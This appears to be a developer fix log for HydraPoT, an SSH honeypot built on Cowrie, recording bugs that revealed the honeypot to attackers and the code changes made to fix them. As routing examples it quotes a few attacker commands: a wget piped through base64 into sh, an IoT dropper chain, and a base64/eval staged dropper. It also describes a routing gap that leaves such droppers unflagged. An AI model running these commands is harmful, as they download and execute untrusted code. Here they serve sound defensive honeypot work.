# Fix log

Each entry is a real bug found in HydraPoT, what it looked like from the
attacker's side, why it happened, and what was changed. Newest first.

Format: **Problem** → what broke. **Cause** → why. **Fix** → what changed.
Every entry names the files touched so the change can be reviewed or reverted.

---

## 2026-08-31 — Cowrie-owned files: read, chmod and rm

### Problem

A downloaded file existed and did not exist at the same time:

```
root@psu:~# wget https://.../README.md
Saving to: '/root/README.md'          ... saved

root@psu:~# cat /root/README.md
cat: /root/README.md: No such file or directory

root@psu:~# chmod +x README.md        (silent success)
root@psu:~# ls -la README.md
-rw-r--r-- 1 root root 5278 ...       ← still not executable

root@psu:~# rm README.md
rm: cannot remove 'README.md': No such file or directory
root@psu:~# cat README.md
# ATT&CK® STIX Data ...               ← 5 KB of the file just "removed"
```

Contradicting itself inside two commands is the fastest way for an attacker to
identify a honeypot.

### Cause

Four separate layers, each individually reasonable:

1. `main.py` intercepted `wget`/`curl` **before routing** and called
   `_fake_download_output()` — a synthetic transcript logged under agent
   `"cowrie"` while Cowrie was never contacted. It printed
   `Connecting to ...:80` even for an `https://` URL, a one-line giveaway.
2. `router.py` had no rule preferring Cowrie for transfers. `wget` scores
   FI 3, and `fi_routing` sends band 3 to `on_device`.
3. `update_state()` registered the download in `SYSTEM_STATE["files"]` with
   placeholder content, so `_needs_llm()` and `_references_tracked_file()`
   both classified it as an LLM-owned file and forced reads onto `on_device`.
4. `_resolve_chmod()` answered `chmod` from `SYSTEM_STATE` alone, and
   `_references_tracked_file()` matched tokens exactly — the attacker types
   `rm README.md` but the file is stored as `/root/README.md`, so `rm` fell
   through to `on_device`, which invented the error.

Underneath all four: Cowrie genuinely implements `wget`/`curl`. It opens the
socket, fetches the bytes, and registers the file in its own filesystem.
`CowrieAgent` holds **one persistent shell per attacker session**, so state
carries across commands. Verified against the live backend — a real 5,278-byte
`README.md` that `ls -la` listed and `cat` printed in full.

### Fix

* `main.py` — the `wget`/`curl` branch now calls
  `cowrie.send_streaming(cmd, write_fn)` instead of `_fake_download_output()`.
* `router.py` — added `COWRIE_AUTHORITATIVE = {"wget", "curl"}`, checked
  **after** `_is_cloud()` so `wget http://x/p.sh | base64 -d | sh` still
  escalates to cloud, and **before** FI routing so a plain transfer reaches
  Cowrie.
* `main.py` — downloads are marked `"backend": "cowrie"` in
  `SYSTEM_STATE["files"]`. `_needs_llm()` and `_references_tracked_file()`
  skip records carrying that marker, which matches the latter's own docstring
  ("files ... not guaranteed to exist in Cowrie's real filesystem").
* `main.py` — new `_cowrie_backed_path()` resolves relative paths and forces
  `agent = "cowrie"` for any command touching a Cowrie-owned file, so `rm`
  and `chmod` mutate the same filesystem `cat` reads from.
* `main.py` — `_resolve_chmod()` returns "not handled" for Cowrie-backed
  files rather than updating `SYSTEM_STATE` and reporting success.

Files: `main.py`, `router.py`

---

## 2026-08-31 — Every SSH session was root

### Problem

Logging in as any account produced a root shell:

```
$ ssh admin@0.0.0.0 -p 2223
root@psu:~#          ← expected admin@psu:~$
```

### Cause

`ssh_server.py` resolved the account with
`conn.get_extra_info("server")`. asyncssh has no `"server"` key, so this
always returned `None`, `getattr(None, "username", None)` returned `None`, and
the `or "root"` fallback fired for every session. The bug was invisible
because the fallback produced a plausible result.

`validate_password()` returns `True` unconditionally — by design, any username
and password log in. So the account is whatever the attacker types, and it
must be carried through correctly.

### Fix

`ssh_server.py` now asks asyncssh directly with
`process.get_extra_info("username")`, falling back to
`conn.get_owner().username` (the `HoneypotServer` instance, which records the
name in `validate_password`), then `"root"`. Verified over real SSH for
`root`, `admin` and `ubuntu`.

Files: `ssh_server.py`

---

## 2026-08-31 — `cd` moved the prompt but not the shell

### Problem

```
admin@psu:~$ cd /home
admin@psu:/home$ pwd
/root                 ← prompt moved, the agent did not
admin@psu:/home$ ls
                      ← listing /root, which looks empty from here
```

### Cause

Two independent working-directory trackers:

* `ssh_server.py` kept a local `cwd` that drove **the prompt only**.
* `main.py` kept `SYSTEM_STATE["cwd"]` that drove **command output**.

`ssh_server.py` handled `cd` locally and then `continue`d, so `cd` never
reached the command handler and `SYSTEM_STATE["cwd"]` stayed frozen at its
initial value for the whole session.

Separately, `make_command_handler()` had no `username` parameter, and both
`SYSTEM_STATE["cwd"]` and `_compute_cd()`'s home lookup were hardcoded to
`root`, so `cd ~` and bare `cd` resolved to `/root` for every account.

### Fix

* `ssh_server.py` — `cd` is still tracked locally for an instant prompt, but
  the `continue` is gone so the handler also sees it. An `is_cd` flag keeps
  the local prompt authoritative for that one command.
* `ssh_server.py` — home follows the account for the prompt, bare `cd`,
  `cd ~`, and `cd ~/...` expansion (the last was missing entirely — `cd ~/.ssh`
  used to resolve to `/~/.ssh`).
* `main.py` — `make_command_handler(..., username=...)`; unknown accounts are
  registered in `SYSTEM_STATE["users"]` with `/home/<user>`; the home lookups
  in `_compute_cd()` follow the session account.
* `ssh_server.py` — the username is passed through `handler_factory`.

Files: `main.py`, `ssh_server.py`

### Known limitation

A non-root attacker still starts in `/root`. Cowrie's filesystem contains no
`/home/<user>` and `mkdir -p` will not create one — it is a fixed image with
`/root` and `/home/phil`. HydraPoT also authenticates to Cowrie as `root`, so
every Cowrie-answered command reflects root's view. Landing a non-root account
in its own home requires customising Cowrie's filesystem.

---

## 2026-08-31 — Persona was hardcoded in Python

### Problem

The fake machine's identity — accounts, password hashes, tool versions,
directory tree, package names — lived as literals inside `main.py`. A
deployment could not present a database server (`postgres`), a web server
(`www-data`), or a non-Ubuntu box without editing code.

Worse, the default account list shipped `phil`, which is **Cowrie's stock demo
user**. Its presence identifies the machine as a honeypot.

### Fix

Moved to `config.yaml` under `system_state:`, with the previous values kept as
defaults in `config_loader.py` so behaviour is unchanged until edited:

| Key | Was | Controls |
|---|---|---|
| `users` | `SYSTEM_STATE["users"]` | fake `/etc/passwd`; `home` is where `cd ~` lands |
| `shadow` | `SYSTEM_STATE["shadow"]` | fake `/etc/shadow` |
| `versions` | `DEFAULT_VERSIONS` | `<tool> --version` output |
| `known_dirs` | `_KNOWN_BASE_DIRS` | directories that exist with nothing tracked under them |
| `tool_packages` | `TOOL_TO_PACKAGE` | `apt install <pkg>` → command provided |

`phil` was removed from the defaults.

`config_loader` merges `system_state` **per key**, so an existing `config.yaml`
that omits these keys keeps working.

Deliberately **not** moved, because they are mechanism rather than persona and
config could silently break dispatch: `EDITORS`, `INTERACTIVE`, `SLOW`, and
`VIRTUAL_FILES` (whose values are generator functions, not data).

Files: `main.py`, `config_loader.py`, `config.yaml`

---

## Open — not yet fixed

* **Cowrie ignores symbolic `chmod`.** Numeric works, symbolic is a silent
  no-op. Measured against the live backend on 2026-08-31:

  | form | result |
  |---|---|
  | `chmod 755` / `chmod 0755` | works — `-rwxr-xr-x` |
  | `chmod +x` | no-op |
  | `chmod u+x` / `a+x` / `ug+x` | no-op |
  | `chmod u=rwx,go=rx` | no-op |

  `chmod +x` is the third line of nearly every IoT dropper chain
  (`wget x; chmod +x x; ./x`), so it is common. Impact is **cosmetic only**:
  execution still works — `./payload` really runs — so the chain completes.
  It shows only if the attacker runs `ls -la` to verify the bit.

  Fix would be to translate symbolic to numeric before handing the command to
  Cowrie: read the current mode with `ls -la`, apply the bits, send
  `chmod <octal>`. One extra round trip (~0.3s), no guessing at the base mode.
  Routing chmod to an LLM does NOT work — see the note below.


* **`_PURE_ASSIGN` routing bypass.** `main.py` short-circuits any command that
  is entirely `NAME=value` assignments to Cowrie, ~260 lines before
  `classify()` runs. `_ASSIGN` permits `$(...)` as a value, so a staged
  dropper (`P=$(echo "..." | base64 -d)` then `eval "${P/x/l}"`) has its whole
  build phase routed to Cowrie and never marked as obfuscated. `router.classify()`
  itself is correct — it returns `cloud` for all three stages.
* **`cd -`** resolves to the current directory instead of the previous one
  (`ssh_server.py`, marked `# simplification`).
* **`plugins/rules/crypto_mining.yml`** is misnamed — its contents are
  `name: Data Exfiltration Detection`. It is loaded and applied to live FI
  scoring.
* **`flush_interval`** is read in `plugins/plugin_loader.py` but never used;
  there is no timer thread, so exporters only flush when the buffer fills.
